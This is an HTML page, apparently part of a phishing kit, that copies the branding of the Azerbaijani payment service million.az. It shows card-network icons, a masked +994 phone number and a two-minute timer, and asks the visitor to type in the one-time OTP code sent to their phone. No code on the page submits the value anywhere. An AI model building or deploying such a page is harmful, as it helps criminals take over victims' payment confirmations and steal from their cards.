<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>M10</title>
    <link rel="stylesheet" href="../../../cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"> <!-- Font Awesome ikonları için -->
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #fffff; /* Koyu turuncu arka plan */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #fff; /* Beyaz arka plan */
            border-radius: 15px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 50px;
            width: 55vw; /* Set width to 55% of the viewport width */
            height: 55vh; /* Set height to 55% of the viewport height */
            text-align: center;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
        }
        input[type="number"] {
            width: calc(100% - 12px);
            padding: 10px;
            border: 2px solid black; /* Koyu turuncu çerçeve */
            border-radius: 40px;
            box-sizing: border-box;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 40px;
            background-color: #cccccc; /* Default gray when disabled */
            color: #fff;
            cursor: not-allowed;
            font-size: 16px;
            transition: background-color 0.3s ease;
            margin-top: 20px; /* Butonu yukarı taşı */
        }
        button:enabled {
            background-color: #45a049; /* Green color when enabled */
            cursor: pointer;
        }
        button:disabled {
            background-color: #cccccc; /* Disable color when button is disabled */
            cursor: not-allowed;
        }
        button:hover {
            background-color: #45a049; /* Hover effect for green button */
        }
        .logo {
            margin-bottom: 20px;
            text-align: center;
        }
        .bank-icons {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        .bank-icons i {
            font-size: 24px;
            margin: 0 10px;
            color: #888;
            transition: color 0.3s ease;
        }
        .bank-icons i:hover {
            color: #333;
        }
        .timer {
            font-size: 2rem;
            color: #333;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://million.az/logo/main-logo.svg" alt="Logo" width="200">
        </div>
        <div class="timer" id="timer">02:00</div> <!-- 2 dakikalık zaman sayacı -->
        <form id="myForm">
            <div class="form-group">
                <div class="item item-indent">Telefonunuza gələn birdəfəlik OTP şifrəni daxil edin. </div>
                <label for="cardName">Şifrə göndərildi: +994*******</label>
                <input type="number" id="cardName" placeholder="Otp Kod" maxlength="7" minlength="4" required>
            </div>
      
            <div style="text-align: center;">
                <button type="button" id="submitButton" disabled>İləri <i class="fas fa-arrow-right"></i></button>
            </div>
        </form>
        <div class="bank-icons">
            <i class="fab fa-cc-visa"></i>
            <i class="fab fa-cc-mastercard"></i>
            <i class="fab fa-cc-amex"></i>
        </div>
    </div>

    <script>
        // Başlangıç zamanı
        var startTime = new Date().getTime();

        // 2 dakika sonraki zamanı hesapla
        var endTime = startTime + (2 * 60 * 1000);

        // Her saniyede bir zamanı güncelle
        var timerInterval = setInterval(function() {
            // Geçen süreyi hesapla
            var currentTime = new Date().getTime();
            var elapsedTime = endTime - currentTime;

            // Dakika ve saniye değerlerini hesapla
            var minutes = Math.floor((elapsedTime % (1000 * 60 * 60)) / (1000 * 60));
            var seconds = Math.floor((elapsedTime % (1000 * 60)) / 1000);

            // Zamanı güncelle
            document.getElementById("timer").innerHTML = formatTime(minutes) + ":" + formatTime(seconds);

            // Zaman dolunca butonu devre dışı bırak
            if (elapsedTime < 0) {
                clearInterval(timerInterval);
                document.getElementById("timer").innerHTML = "00:00";
                document.getElementById("submitButton").disabled = true;
            }
        }, 1000);

        // Zamanı iki haneli format haline getir
        function formatTime(time) {
            return time < 10 ? "0" + time : time;
        }

        // Alanlar dolunca butonu etkinleştir
        document.getElementById("myForm").addEventListener("input", function() {
            var cardName = document.getElementById("cardName").value;
            
            var submitButton = document.getElementById("submitButton");

            // Otp kodunun uzunluğunun 4 ile 7 arasında olup olmadığını kontrol et
            if (cardName.trim().length >= 4 && cardName.trim().length <= 7) {
                submitButton.disabled = false;
            } else {
                submitButton.disabled = true;
            }
        });

        // Pencereyi büyüt
        window.onload = function() {
            // Resize the window to 55% of the viewport size
            window.resizeTo(window.innerWidth * 0.55, window.innerHeight * 0.55);
        };
    </script>

    </script>

</body>

</html>
